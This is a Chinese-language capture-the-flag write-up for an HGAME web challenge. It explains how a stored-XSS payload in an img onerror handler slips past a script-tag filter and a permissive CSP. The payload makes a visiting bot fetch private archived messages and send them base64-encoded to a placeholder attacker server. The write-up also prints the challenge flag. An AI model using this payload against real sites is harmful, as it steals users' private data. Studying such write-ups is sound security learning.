# 博丽神社的绘马挂 - WriteUp

## 题目信息

- **类型**: Web - XSS
- **难度**: Week1
- **Flag**: `hgame{THE_SECRET_of-H@kURei_J1nJa2b15c14a}`

## 题目分析

这是一个留言板系统，用户可以发布"愿望"（留言），并且有一个"呼叫灵梦"按钮会让机器人来查看留言。

### 关键特征

1. **XSS过滤**: `<script>` 标签被禁用，但 `<img>` 标签可用
2. **私密消息**: 可以发布只有自己和灵梦能看到的私密消息
3. **机器人**: 点击"呼叫灵梦"会触发机器人访问页面
4. **归档功能**: 存在 `/api/archives` 接口获取归档消息

### CSP策略

```
default-src 'self'; 
script-src 'self' 'unsafe-inline' http: https:; 
style-src 'self' 'unsafe-inline'; 
connect-src 'self' http: https:; 
img-src http: https: data:;
```

CSP允许 `unsafe-inline` 和外部图片加载，可以利用 `<img onerror>` 执行JS并外带数据。

## 解题思路

1. 利用 `<img onerror>` 绕过 `<script>` 过滤执行JavaScript
2. 通过XSS让机器人（灵梦）访问 `/api/archives` 获取她的归档消息
3. 将数据base64编码后通过图片请求发送到攻击者服务器

## Exploit

### Payload

```html
<img src=x onerror="fetch('/api/archives').then(r=>r.text()).then(t=>new Image().src='http://YOUR_SERVER:8080/?data='+btoa(t))">
```

### 攻击步骤

1. 在攻击者服务器启动HTTP服务监听数据:
   ```bash
   python -m http.server 8080
   ```

2. 登录目标系统（账号: 1, 密码: 1）

3. 点击"发布愿望"，在内容框粘贴Payload

4. **勾选"悄悄话"**（私密选项）

5. 点击"挂上绘马"提交

6. 回到首页，点击"🚨 呼叫灵梦"

7. 查看攻击服务器日志，收到类似请求:
   ```
   GET /?data=W3siY29udGVudCI6IlRoZV9TZWNyZXRfSXM6...
   ```

8. Base64解码获取flag:
   ```bash
   echo "W3siY29udGVudCI6IlRoZV9TZWNyZXRfSXM6..." | base64 -d
   ```

### 服务器收到的数据

```json
[{
  "content": "The_Secret_Is: Hgame{THE_SECRET_of-H@kURei_J1nJa2b15c14a}",
  "id": 1001,
  "is_private": true,
  "status": "archived",
  "timestamp": "2024-01-01 00:00:00",
  "username": "Reimu"
}]
```

## 知识点

1. **存储型XSS**: 恶意代码被存储在服务器上，其他用户访问时触发
2. **`<img onerror>` 绕过**: 当 `<script>` 被过滤时，可以使用图片标签的事件处理器执行JS
3. **数据外带**: 通过创建新的Image对象，将数据编码后作为URL参数发送到外部服务器
4. **CSP绕过**: `img-src http: https:` 允许加载任意外部图片，可用于数据外带

## Flag

```
hgame{THE_SECRET_of-H@kURei_J1nJa2b15c14a}
```
